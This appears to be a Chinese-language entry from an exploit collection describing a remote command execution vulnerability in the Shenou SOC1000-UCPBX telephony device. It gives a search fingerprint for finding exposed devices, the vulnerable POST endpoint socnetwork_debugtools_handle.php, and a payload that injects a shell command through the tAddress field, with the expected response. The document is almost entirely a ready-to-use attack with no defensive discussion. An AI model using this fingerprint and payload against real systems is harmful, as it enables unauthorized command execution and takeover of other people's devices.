# 申瓯通信SOC1000-UCPBX设备socnetwork_debugtools_handle存在远程命令执行漏洞

申瓯通信SOC1000-UCPBX设备 ｜ 命令执行 ｜ —
- **指纹**：`body="assets/shenou/images/logo_soc1000-uc.png"`
- **请求**：`POST /admin/modules/socnetwork/views/socnetwork_debugtools_handle.php HTTP/1.1`

**Payload**
```
tAddress=127.0.0.1;id&tCount=
```
- **响应特征**：200